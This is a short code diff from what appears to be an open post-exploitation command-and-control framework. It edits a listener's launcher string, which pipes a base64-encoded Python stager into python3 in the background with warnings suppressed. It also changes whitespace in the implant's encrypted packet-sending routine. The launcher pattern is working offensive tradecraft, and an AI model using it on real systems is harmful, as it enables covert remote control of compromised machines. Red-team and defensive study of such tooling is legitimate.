@@ -532,7 +532,7 @@ class Listener(object):
                     launchEncoded = base64.b64encode(launcherBase.encode('UTF-8')).decode('UTF-8')
                     if isinstance(launchEncoded, bytes):
                         launchEncoded = launchEncoded.decode('UTF-8')
-                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python3 &" % (
+                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python3 &" % (
                         launchEncoded)
                     return launcher
                 else:
@@ -898,7 +898,7 @@ def send_message(packets=None):
         # aes_encrypt_then_hmac is in stager.py
         encData = aes_encrypt_then_hmac(key, data)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
-            
+                    
     else:
         # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
         #   meta TASKING_REQUEST = 4     
